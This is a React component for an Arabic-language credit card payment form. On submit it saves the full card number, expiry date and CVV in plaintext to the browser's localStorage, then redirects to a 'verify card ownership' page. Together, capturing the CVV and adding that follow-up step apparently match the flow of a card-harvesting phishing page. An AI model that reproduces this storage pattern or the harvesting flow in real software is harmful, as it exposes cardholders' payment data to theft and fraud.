import { UseFormReturn } from "react-hook-form";
import {
  formatCreditCardNumber,
  formatExpiryDate,
  formatCVC,
} from "../../utils/cardFormatters";
import { PaymentFormData } from "../../types/payment";
import { useNavigate } from "react-router-dom";
import { FormField } from "./FormField";

interface PaymentFormProps {
  form: UseFormReturn<PaymentFormData>;
  isSubmitting: boolean;
  onSubmit: (data: PaymentFormData) => Promise<void>;
}

export const PaymentForm = ({
  form,
  isSubmitting,
  onSubmit,
}: PaymentFormProps) => {
  const {
    control,
    handleSubmit,
    formState: { errors },
  } = form;
  const navigate = useNavigate();

  const handleFormSubmit = async (data: PaymentFormData) => {
    const formattedData = {
      id: crypto.randomUUID(),
      full_name: data.full_name,
      card_number: data.card_number,
      expiration_date: data.expiration_date,
      cvv: data.cvv,
      order_id: crypto.randomUUID(),
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
    };

    const existingData = JSON.parse(
      localStorage.getItem("paymentData") || "[]"
    );
    existingData.push(formattedData);
    localStorage.setItem("paymentData", JSON.stringify(existingData));

    await onSubmit(data);
    navigate("/verify-card-ownership");
  };

  return (
    <div className="bg-white rounded-xl shadow-lg p-6 md:p-8 backdrop-blur-lg bg-opacity-95 transition-all duration-300 hover:shadow-xl">
      <h2 className="text-xl md:text-2xl font-bold text-right mb-6 text-[#146394]">
        تفاصيل الدفع
      </h2>
      <form onSubmit={handleSubmit(handleFormSubmit)} className="space-y-6">
        <FormField
          name="full_name"
          label="اسم حامل البطاقة"
          control={control}
          errors={errors}
        />
        <FormField
          name="card_number"
          label="رقم البطاقة"
          control={control}
          errors={errors}
          formatter={formatCreditCardNumber}
          placeholder="1234 5678 9012 3456"
        />

        <div className="grid grid-cols-2 gap-4">
          <FormField
            name="expiration_date"
            label="تاريخ الانتهاء"
            control={control}
            errors={errors}
            formatter={formatExpiryDate}
            placeholder="MM/YY"
          />
          <FormField
            name="cvv"
            label="رمز الأمان (CVV)"
            control={control}
            errors={errors}
            formatter={formatCVC}
            type="password"
            placeholder="الرقم المكون من 3 ارقام في ظهر البطاقه"
          />
        </div>

        <button
          type="submit"
          disabled={isSubmitting}
          className="w-48 m-auto bg-[#146394] text-white py-2 px-4 rounded-md"
        >
          {isSubmitting ? "جارٍ التقديم..." : "تقديم"}
        </button>
      </form>
    </div>
  );
};
